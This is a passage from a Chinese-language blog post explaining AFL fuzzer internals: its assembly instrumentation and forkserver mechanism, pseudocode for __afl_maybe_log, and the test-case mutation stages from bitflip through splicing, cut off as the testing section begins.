movq  %rax, %rdi\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;atoi&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;shmat&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpq $-1, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Store the address of the SHM region. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax, (%rdx)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">  <span class="string">&quot;  movq %rax, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_forkserver:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Enter the fork server mode to avoid the overhead of execve() calls. We\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     push rdx (area ptr) twice to keep stack alignment neat. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushq %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushq %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     the parent doesn&#x27;t want to use the fork server. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi       /* file desc */\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpq $4, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne  __afl_fork_resume\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_fork_wait_loop:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Wait for parent by reading from the pipe. Abort if read fails. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;, %rdi             /* file desc */\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">  <span class="string">&quot;  cmpq $4, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne  __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Once woken up, create a clone of our process. This is an excellent use\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     abort(), raise(), and a bunch of other things :-( */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;fork&quot;</span>)</span><br><span class="line">  <span class="string">&quot;  cmpq $0, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jl   __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je   __afl_fork_resume\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* In parent process: write PID to pipe, then wait for child. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movl %eax, __afl_fork_pid(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx                   /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_fork_pid(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi             /* file desc */\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $0, %rdx                   /* no flags  */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi     /* status    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq __afl_fork_pid(%rip), %rdi /* PID       */\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;waitpid&quot;</span>)</span><br><span class="line">  <span class="string">&quot;  cmpq $0, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jle  __afl_die\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Relay wait status to pipe, then loop back. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $4, %rdx               /* length    */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq __afl_temp(%rip), %rsi /* data      */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi         /* file desc */\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_fork_wait_loop\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_fork_resume:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* In child process: close fds, resume execution. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> STRINGIFY(FORKSRV_FD) <span class="string">&quot;, %rdi\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;close&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq $&quot;</span> STRINGIFY((FORKSRV_FD + <span class="number">1</span>)) <span class="string">&quot;, %rdi\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;close&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popq %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popq %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r12, %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popq %r12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  0(%rsp), %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  8(%rsp), %rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 16(%rsp), %rdi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 32(%rsp), %rsi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 40(%rsp), %r8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 48(%rsp), %r9\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 56(%rsp), %r10\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 64(%rsp), %r11\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  96(%rsp), %xmm0\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 112(%rsp), %xmm1\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 128(%rsp), %xmm2\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 144(%rsp), %xmm3\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 160(%rsp), %xmm4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 176(%rsp), %xmm5\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 192(%rsp), %xmm6\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 208(%rsp), %xmm7\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 224(%rsp), %xmm8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 240(%rsp), %xmm9\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 256(%rsp), %xmm10\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 272(%rsp), %xmm11\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 288(%rsp), %xmm12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 304(%rsp), %xmm13\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 320(%rsp), %xmm14\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 336(%rsp), %xmm15\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq 352(%rsp), %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_store\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_die:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rax, %rax\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;_exit&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup_abort:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Record setup failure so that we don&#x27;t keep calling\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     shmget() / shmat() over and over again. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  incb __afl_setup_failure(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r12, %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  popq %r12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  0(%rsp), %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  8(%rsp), %rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 16(%rsp), %rdi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 32(%rsp), %rsi\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 40(%rsp), %r8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 48(%rsp), %r9\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 56(%rsp), %r10\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 64(%rsp), %r11\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  96(%rsp), %xmm0\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 112(%rsp), %xmm1\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 128(%rsp), %xmm2\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 144(%rsp), %xmm3\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 160(%rsp), %xmm4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 176(%rsp), %xmm5\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 192(%rsp), %xmm6\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 208(%rsp), %xmm7\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 224(%rsp), %xmm8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 240(%rsp), %xmm9\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 256(%rsp), %xmm10\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 272(%rsp), %xmm11\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 288(%rsp), %xmm12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 304(%rsp), %xmm13\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 320(%rsp), %xmm14\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq 336(%rsp), %xmm15\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq 352(%rsp), %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp __afl_return\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.AFL_VARS:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_area_ptr, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_prev_loc, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_fork_pid, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_temp, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .comm   __afl_setup_failure, 1\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_area_ptr, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_prev_loc, 8\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_fork_pid, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_temp, 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .lcomm   __afl_setup_failure, 1\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;  .comm    __afl_global_area_ptr, 8, 8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.AFL_SHM_ENV:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  .asciz \&quot;&quot;</span> SHM_ENV_VAR <span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !_HAVE_AFL_AS_H */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码将在插完所有的桩后插入程序的最后，所以它只是相当于定义了<code>__afl_maybe_log</code>函数。因为是汇编写的，比较晦涩，所以简单写了个伪代码，便于理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __afl_maybe_log() &#123;</span><br><span class="line">    <span class="keyword">if</span> (SHM was <span class="keyword">not</span> mapped) &#123;</span><br><span class="line">        initialize SHM;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            read(<span class="number">198</span>, tmp, <span class="number">4</span>);</span><br><span class="line">            child_pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (!child_pid) <span class="keyword">goto</span> __afl_store;</span><br><span class="line">            write(<span class="number">198</span> + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>);</span><br><span class="line">            waitpid(child_pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">            write(<span class="number">198</span> + <span class="number">1</span>, &amp;status, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">__afl_store:</span><br><span class="line">    cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">    shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">    prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AFL使用了共享内存来记录每次测试的执行路径。如果执行<code>__afl_maybe_log</code>时共享内存还没有被映射过来，说明这是第一次运行目标程序并且是main函数开头的<code>__afl_maybe_log</code>，那么就将这个进程作为forkserver，用来与fuzzer通信。当fuzzer发出指令时就调用fork函数克隆自身并将信息传回去，其中198和199分别是fuzzer和forkserver通信的控制管道和状态管道。因为forkserver是在main函数的开头陷入死循环，所以fork出来的子进程能够完整地运行目标程序。此时共享内存已经被映射，所以之后执行<code>__afl_maybe_log</code>函数时就会执行<code>__afl_store</code>，在共享内存中记录当前程序的执行路径，完成“桩”的功能。</p><p>模糊测试常规的思路是用<code>execve()</code>来运行目标程序，但是<code>execve()</code>的执行非常浪费时间，因为需要等待链接器和各种链接库的初始化。AFL通过对目标程序的改造，使它在第一次执行时变成forkserver，这样在后续需要运行目标程序时只需要复制自己即可，这种机制大大地提高了模糊测试的效率。</p><h1 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h1><p>正片从这里才开始，相关的代码在afl-fuzz.c中，有八千多行。总体的流程就是参数检查–&gt;读取测试用例–&gt;测试用例变异–&gt;测试，细节太多，这里就讲最关键的测试用例变异部分和测试部分。</p><h2 id="测试用例变异"><a href="#测试用例变异" class="headerlink" title="测试用例变异"></a>测试用例变异</h2><h3 id="SIMPLE-BITFLIP-dictionary-construction"><a href="#SIMPLE-BITFLIP-dictionary-construction" class="headerlink" title="SIMPLE BITFLIP (+dictionary construction)"></a>SIMPLE BITFLIP (+dictionary construction)</h3><p>顾名思义就是按位翻转，它对当前需要变异的测试用例按顺序执行以下六种变换。</p><h4 id="bitflip-1-1"><a href="#bitflip-1-1" class="headerlink" title="bitflip 1/1"></a>bitflip 1/1</h4><p>每次翻转<strong>1</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始。同时检查是否有类似于PNG文件中的<code>IHDR</code>这样token存在，因为这样的token破坏之后就破坏了原来的文件格式，比如一个要求PNG文件作为输入的程序，当输入非标准PNG文件时执行路径一定是相同的，所以就不需要再相同的执行路径上浪费时间。</p><h4 id="bitflip-2-1"><a href="#bitflip-2-1" class="headerlink" title="bitflip 2/1"></a>bitflip 2/1</h4><p>每次翻转相邻的<strong>2</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</p><h4 id="bitflip-4-1"><a href="#bitflip-4-1" class="headerlink" title="bitflip 4/1"></a>bitflip 4/1</h4><p>每次翻转相邻的<strong>4</strong>个bit，按照每<strong>1</strong>个bit的步长从头开始</p><h4 id="bitflip-8-8"><a href="#bitflip-8-8" class="headerlink" title="bitflip 8/8"></a>bitflip 8/8</h4><p>每次翻转相邻的<strong>8</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个byte做翻转。同时生成effector map，这个以8个字节为一组，表示该位置上的8个字节对执行路径是否有影响，即该组字节是否有效。如果该组字节修改前后执行路径不变说明是无效字节，后续的变异中会跳过这些无效字节，从而提高效率。</p><h4 id="bitflip-16-8"><a href="#bitflip-16-8" class="headerlink" title="bitflip 16/8"></a>bitflip 16/8</h4><p>每次翻转相邻的<strong>16</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个word做翻转</p><h4 id="bitflip-32-8"><a href="#bitflip-32-8" class="headerlink" title="bitflip 32/8"></a>bitflip 32/8</h4><p>每次翻转相邻的<strong>32</strong>个bit，按照每<strong>8</strong>个bit的步长从头开始，即依次对每个dword做翻转</p><h3 id="ARITHMETIC-INC-DEC"><a href="#ARITHMETIC-INC-DEC" class="headerlink" title="ARITHMETIC INC/DEC"></a>ARITHMETIC INC/DEC</h3><p>分别以1、2、4个字节为一组进行1到35的加减运算，步长为1个字节，在bitflip中出现过的变异结果将不会出现，在effector map被标记为无效的字节也将跳过。在2、4个字节的情况下还同时考虑了大小端两种情况。</p><h3 id="INTERESTING-VALUES"><a href="#INTERESTING-VALUES" class="headerlink" title="INTERESTING VALUES"></a>INTERESTING VALUES</h3><p>分别以1、2、4个字节为一组进行特殊值替换，步长为1个字节，同样，之前出现过的测试用例和在effector map被标记为无效的字节将跳过。特殊值的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERESTING_16 \</span></span><br><span class="line"><span class="meta">  -32768,        <span class="comment">/* Overflow signed 16-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -129,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   128,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   255,          <span class="comment">/* Overflow unsig 8-bit when incremented   */</span> \</span></span><br><span class="line"><span class="meta">   256,          <span class="comment">/* Overflow unsig 8-bit                    */</span> \</span></span><br><span class="line"><span class="meta">   512,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1000,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1024,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   4096,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32767         <span class="comment">/* Overflow signed 16-bit when incremented */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERESTING_32 \</span></span><br><span class="line"><span class="meta">  -2147483648LL, <span class="comment">/* Overflow signed 32-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -100663046,    <span class="comment">/* Large negative number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">  -32769,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   32768,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   65535,        <span class="comment">/* Overflow unsig 16-bit when incremented  */</span> \</span></span><br><span class="line"><span class="meta">   65536,        <span class="comment">/* Overflow unsig 16 bit                   */</span> \</span></span><br><span class="line"><span class="meta">   100663045,    <span class="comment">/* Large positive number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">   2147483647    <span class="comment">/* Overflow signed 32-bit when incremented */</span></span></span><br></pre></td></tr></table></figure><h3 id="DICTIONARY-STUFF"><a href="#DICTIONARY-STUFF" class="headerlink" title="DICTIONARY STUFF"></a>DICTIONARY STUFF</h3><p>将用户定义的token和之前bitflip找到的token分别替换、插入到测试用例的每个位置，其中bitflip找到的token没用做插入，同样在effector map被标记为无效的字节将跳过。</p><h3 id="RANDOM-HAVOC"><a href="#RANDOM-HAVOC" class="headerlink" title="RANDOM HAVOC"></a>RANDOM HAVOC</h3><p>对测试用例做随机次数的以下操作再传入测试</p><blockquote><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></blockquote><h3 id="SPLICING"><a href="#SPLICING" class="headerlink" title="SPLICING"></a>SPLICING</h3><p>从测试用例队列中随机选取一个与当前测试用例差异明显的测试用例在随机位置进行拼接，在进入到RANDOM HAVOC环节进行随机变化</p><h2 id="测试"><a href="#测试" class="headerlink" 